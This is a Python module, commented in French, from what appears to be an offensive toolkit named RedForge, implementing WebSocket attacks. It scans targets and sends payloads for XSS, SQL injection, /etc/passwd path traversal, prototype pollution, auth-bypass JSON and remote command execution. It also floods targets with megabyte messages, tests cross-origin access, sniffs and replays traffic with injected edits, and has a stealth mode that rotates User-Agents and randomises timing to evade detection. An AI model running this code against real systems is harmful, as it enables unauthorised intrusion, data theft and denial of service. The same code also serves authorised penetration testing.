#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques WebSocket pour RedForge
Détection et exploitation des vulnérabilités WebSocket
Version: 2.0.0 - Support Multi-Attaque, Stealth & APT
"""

import json
import time
import random
import threading
import websocket
import requests
from typing import Dict, Any, List, Optional, Callable
from urllib.parse import urlparse
from dataclasses import dataclass, field

from src.utils.color_output import console


@dataclass
class WebSocketConfig:
    """Configuration des attaques WebSocket"""
    stealth_mode: bool = False
    aggressive_mode: bool = False
    timeout: int = 10
    delay_min: float = 0.5
    delay_max: float = 2.0
    max_message_size: int = 1000000
    replay_delay: float = 0.5


class WebSocketAttacks:
    """Attaques sur les WebSockets avec support stealth et APT"""
    
    def __init__(self):
        self.config = WebSocketConfig()
        
        self.test_messages = [
            "test",
            "<script>alert('XSS')</script>",
            "{'id': '1' OR '1'='1'}",
            "../../../etc/passwd",
            "{\"__proto__\": {\"isAdmin\": true}}",
            "admin' OR '1'='1",
            "<img src=x onerror=alert('XSS')>"
        ]
        
        # Messages furtifs pour mode stealth
        self.stealth_messages = [
            "ping",
            "heartbeat",
            "status",
            "{\"type\": \"ping\"}"
        ]
        
        # Messages APT pour mode agressif
        self.apt_messages = [
            '{"command": "whoami"}',
            '{"exec": "id"}',
            '{"shell": "ls -la"}',
            '{"cmd": "cat /etc/passwd"}'
        ]
        
        self.attack_patterns = {
            "xss": "<script>alert('XSS')</script>",
            "sqli": "' OR '1'='1",
            "idor": '{"user_id": 2}',
            "auth_bypass": '{"role": "admin"}',
            "dos": '{"data": "A" * 1000000}',
            "rce": '{"cmd": "id"}',
            "path_traversal": '../../../etc/passwd'
        }
    
    def set_stealth_mode(self, enabled: bool = True):
        """Active le mode furtif"""
        self.config.stealth_mode = enabled
        console.print_info(f"🕵️ Mode furtif {'activé' if enabled else 'désactivé'} pour WebSocket")
    
    def set_aggressive_mode(self, enabled: bool = True):
        """Active le mode agressif"""
        self.config.aggressive_mode = enabled
        console.print_info(f"⚡ Mode agressif {'activé' if enabled else 'désactivé'} pour WebSocket")
    
    def _random_delay(self):
        """Ajoute un délai aléatoire pour le mode furtif"""
        if self.config.stealth_mode:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            time.sleep(delay)
    
    def _get_messages(self) -> List[str]:
        """Retourne les messages selon le mode"""
        if self.config.stealth_mode:
            return self.stealth_messages
        elif self.config.aggressive_mode:
            return self.test_messages + self.apt_messages
        return self.test_messages
    
    def scan(self, ws_url: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités WebSocket
        
        Args:
            ws_url: URL WebSocket (ws:// ou wss://)
            **kwargs:
                - headers: Headers personnalisés
                - origin: Origin à tester
                - messages: Messages personnalisés
                - stealth: Mode furtif
                - aggressive: Mode agressif
        """
        console.print_info("🔌 Test des attaques WebSocket")
        
        # Appliquer les modes
        if kwargs.get('stealth'):
            self.set_stealth_mode(True)
        if kwargs.get('aggressive'):
            self.set_aggressive_mode(True)
        
        vulnerabilities = []
        
        # Test de connexion
        connection_result = self._test_connection(ws_url, **kwargs)
        
        if connection_result['connected']:
            console.print_success(f"      ✓ WebSocket connecté")
            
            # Test de cross-origin
            origin_vuln = self._test_cross_origin(ws_url, **kwargs)
            if origin_vuln:
                vulnerabilities.append(origin_vuln)
            
            # Test d'injection
            injection_vulns = self._test_injection(ws_url, connection_result['ws'], **kwargs)
            vulnerabilities.extend(injection_vulns)
            
            # Test d'authentification
            auth_vulns = self._test_auth_bypass(ws_url, connection_result['ws'], **kwargs)
            vulnerabilities.extend(auth_vulns)
            
            # Test de déni de service
            dos_vuln = self._test_dos(ws_url, connection_result['ws'], **kwargs)
            if dos_vuln:
                vulnerabilities.append(dos_vuln)
            
            # Test de replay attack
            replay_vuln = self._test_replay_attack(ws_url, connection_result['ws'], **kwargs)
            if replay_vuln:
                vulnerabilities.append(replay_vuln)
            
            # Test de fragmentation (mode agressif)
            if self.config.aggressive_mode:
                frag_vulns = self._test_fragmentation(ws_url, connection_result['ws'], **kwargs)
                vulnerabilities.extend(frag_vulns)
            
            # Fermer la connexion
            connection_result['ws'].close()
        
        return {
            "target": ws_url,
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "connected": connection_result['connected'],
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _test_connection(self, ws_url: str, **kwargs) -> Dict[str, Any]:
        """Teste la connexion WebSocket"""
        result = {
            "connected": False,
            "ws": None
        }
        
        headers = kwargs.get('headers', {})
        
        # Rotation User-Agent pour mode furtif
        if self.config.stealth_mode:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]
            headers['User-Agent'] = random.choice(user_agents)
        
        try:
            ws = websocket.create_connection(ws_url, timeout=self.config.timeout, 
                                            header=headers)
            result["connected"] = True
            result["ws"] = ws
            self._random_delay()
            
        except Exception as e:
            console.print_warning(f"      ✗ Connexion échouée: {e}")
        
        return result
    
    def _test_cross_origin(self, ws_url: str, **kwargs) -> Optional[Dict[str, Any]]:
        """Teste les vulnérabilités cross-origin"""
        test_origins = [
            "http://evil.com",
            "https://attacker.com",
            "null",
            "https://evil.com.evil.com"
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                ws = websocket.create_connection(ws_url, header=headers, 
                                                timeout=self.config.timeout)
                
                # Tester l'envoi de message
                ws.send('test')
                response = ws.recv(timeout=5)
                ws.close()
                self._random_delay()
                
                if response:
                    return {
                        "type": "cross_origin",
                        "origin": origin,
                        "severity": "HIGH",
                        "details": f"WebSocket accessible depuis {origin}"
                    }
                    
            except Exception:
                continue
        
        return None
    
    def _test_injection(self, ws_url: str, ws: websocket.WebSocket,
                       **kwargs) -> List[Dict[str, Any]]:
        """Teste les injections WebSocket"""
        vulnerabilities = []
        messages = kwargs.get('messages', self._get_messages())
        
        for message in messages:
            try:
                ws.send(message)
                response = ws.recv(timeout=5)
                self._random_delay()
                
                # Vérifier la réflexion
                if message in response:
                    vulnerabilities.append({
                        "type": "reflected_injection",
                        "message": message[:50],
                        "severity": "HIGH",
                        "details": f"Message réfléchi dans la réponse"
                    })
                    console.print_warning(f"      ✓ Injection réfléchie: {message[:30]}...")
                    break
                
                # Vérifier les erreurs
                error_indicators = ['error', 'exception', 'invalid', 'syntax',
                                   'unexpected', 'failed']
                for indicator in error_indicators:
                    if indicator in response.lower():
                        vulnerabilities.append({
                            "type": "error_based_injection",
                            "message": message[:50],
                            "severity": "MEDIUM",
                            "details": f"Erreur générée: {indicator}"
                        })
                        break
                        
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_auth_bypass(self, ws_url: str, ws: websocket.WebSocket,
                         **kwargs) -> List[Dict[str, Any]]:
        """Teste le contournement d'authentification"""
        vulnerabilities = []
        
        auth_messages = [
            '{"role": "admin"}',
            '{"isAdmin": true}',
            '{"privilege": "root"}',
            '{"auth": "bypass"}',
            '{"token": "admin"}',
            '{"user": "administrator"}',
            '{"level": 999}'
        ]
        
        for message in auth_messages:
            try:
                ws.send(message)
                response = ws.recv(timeout=5)
                self._random_delay()
                
                # Vérifier si des privilèges ont été accordés
                success_indicators = ['admin', 'granted', 'success', 'welcome',
                                     'authorized', 'authenticated']
                for indicator in success_indicators:
                    if indicator in response.lower():
                        vulnerabilities.append({
                            "type": "auth_bypass",
                            "message": message,
                            "severity": "CRITICAL",
                            "details": f"Auth bypass possible avec: {message}"
                        })
                        console.print_warning(f"      ✓ Auth bypass: {message}")
                        break
                        
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_dos(self, ws_url: str, ws: websocket.WebSocket,
                 **kwargs) -> Optional[Dict[str, Any]]:
        """Teste la vulnérabilité au déni de service"""
        large_message = "A" * self.config.max_message_size
        start_time = time.time()
        
        try:
            for i in range(5):
                ws.send(large_message)
                self._random_delay()
            
            elapsed = time.time() - start_time
            
            if elapsed > 10:  # Réponse très lente
                return {
                    "type": "dos_vulnerability",
                    "severity": "MEDIUM",
                    "details": "Service vulnérable au déni de service"
                }
                
        except Exception as e:
            return {
                "type": "dos_vulnerability",
                "severity": "HIGH",
                "details": f"Service crashé: {str(e)[:100]}"
            }
        
        return None
    
    def _test_replay_attack(self, ws_url: str, ws: websocket.WebSocket,
                           **kwargs) -> Optional[Dict[str, Any]]:
        """Teste la vulnérabilité au replay attack"""
        test_message = "test_replay_" + str(int(time.time()))
        
        try:
            # Premier envoi
            ws.send(test_message)
            response1 = ws.recv(timeout=5)
            self._random_delay()
            
            # Second envoi (replay)
            ws.send(test_message)
            response2 = ws.recv(timeout=5)
            self._random_delay()
            
            # Si les réponses sont identiques, possible replay attack
            if response1 == response2:
                return {
                    "type": "replay_attack",
                    "severity": "MEDIUM",
                    "details": "Messages identiques acceptés - possible replay attack"
                }
                
        except Exception:
            pass
        
        return None
    
    def _test_fragmentation(self, ws_url: str, ws: websocket.WebSocket,
                           **kwargs) -> List[Dict[str, Any]]:
        """Teste la fragmentation de messages (mode agressif)"""
        vulnerabilities = []
        
        # Messages fragmentés
        fragmented_messages = [
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "adm'in' OR '1'='1",
            ".././../etc/passwd",
            "{'role': 'adm'in'}"
        ]
        
        for message in fragmented_messages:
            try:
                ws.send(message)
                response = ws.recv(timeout=5)
                self._random_delay()
                
                # Vérifier si la fragmentation a réussi
                success_indicators = ['alert', 'root:', 'admin', 'granted']
                for indicator in success_indicators:
                    if indicator in response.lower():
                        vulnerabilities.append({
                            "type": "fragmentation_bypass",
                            "message": message[:50],
                            "severity": "HIGH",
                            "details": f"Fragmentation de message réussie: {indicator}"
                        })
                        console.print_warning(f"      ✓ Fragmentation bypass: {message[:30]}...")
                        break
                        
            except Exception:
                continue
        
        return vulnerabilities
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        return {
            "total": len(vulnerabilities),
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "medium": len([v for v in vulnerabilities if v['severity'] == 'MEDIUM'])
        }
    
    def sniff_messages(self, ws_url: str, duration: int = 30,
                      callback: Optional[Callable] = None) -> List[Dict[str, Any]]:
        """
        Capture les messages WebSocket pendant une durée déterminée
        
        Args:
            ws_url: URL WebSocket
            duration: Durée de capture en secondes
            callback: Fonction de callback pour chaque message
        """
        captured = []
        
        def on_message(ws, message):
            captured.append({
                "timestamp": time.time(),
                "message": message
            })
            if callback:
                callback(message)
        
        def on_error(ws, error):
            console.print_warning(f"Erreur WebSocket: {error}")
        
        ws = websocket.WebSocketApp(ws_url,
                                   on_message=on_message,
                                   on_error=on_error)
        
        thread = threading.Thread(target=ws.run_forever, daemon=True)
        thread.start()
        
        time.sleep(duration)
        ws.close()
        
        return captured
    
    def replay_messages(self, ws_url: str, messages: List[str]) -> Dict[str, Any]:
        """
        Rejoue des messages précédemment capturés
        
        Args:
            ws_url: URL WebSocket
            messages: Liste des messages à rejouer
        """
        results = {
            "success": False,
            "responses": [],
            "modified": False
        }
        
        try:
            ws = websocket.create_connection(ws_url, timeout=self.config.timeout)
            
            for i, msg in enumerate(messages):
                # Modifier légèrement le message pour tester (mode agressif)
                if self.config.aggressive_mode and i > 0:
                    modified_msg = self._modify_message(msg)
                    if modified_msg != msg:
                        results["modified"] = True
                        msg = modified_msg
                
                ws.send(msg)
                response = ws.recv(timeout=5)
                results["responses"].append({
                    "sent": msg[:100],
                    "received": response[:100]
                })
                time.sleep(self.config.replay_delay)
            
            ws.close()
            results["success"] = True
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _modify_message(self, message: str) -> str:
        """Modifie un message pour tester les injections"""
        modifications = [
            ("test", "test' OR '1'='1"),
            ("id", "id=1' AND '1'='1"),
            ("user", "admin"),
            ("role", "admin"),
            ("auth", "bypass")
        ]
        
        modified = message
        for original, injected in modifications:
            if original in message:
                modified = message.replace(original, injected)
                break
        
        return modified
    
    def send_command(self, ws_url: str, command: str) -> Dict[str, Any]:
        """
        Envoie une commande via WebSocket et retourne la réponse
        
        Args:
            ws_url: URL WebSocket
            command: Commande à envoyer
        """
        result = {
            "success": False,
            "command": command,
            "response": None
        }
        
        try:
            ws = websocket.create_connection(ws_url, timeout=self.config.timeout)
            ws.send(command)
            response = ws.recv(timeout=10)
            ws.close()
            
            result["success"] = True
            result["response"] = response
            
        except Exception as e:
            result["error"] = str(e)
        
        return result


# Point d'entrée pour tests
if __name__ == "__main__":
    ws = WebSocketAttacks()
    
    # Test mode standard
    print("=== Mode Standard ===")
    results = ws.scan("ws://example.com/ws")
    print(f"Vulnérabilités WebSocket: {results['count']}")
    
    # Test mode furtif
    print("\n=== Mode Furtif ===")
    ws.set_stealth_mode(True)
    results = ws.scan("ws://example.com/ws")
    print(f"Vulnérabilités WebSocket (stealth): {results['count']}")
    
    # Test mode agressif
    print("\n=== Mode Agressif ===")
    ws.set_aggressive_mode(True)
    results = ws.scan("ws://example.com/ws")
    print(f"Vulnérabilités WebSocket (aggressive): {results['count']}")
    
    # Test sniffing
    print("\n=== Sniffing ===")
    captured = ws.sniff_messages("ws://example.com/ws", duration=5)
    print(f"Messages capturés: {len(captured)}")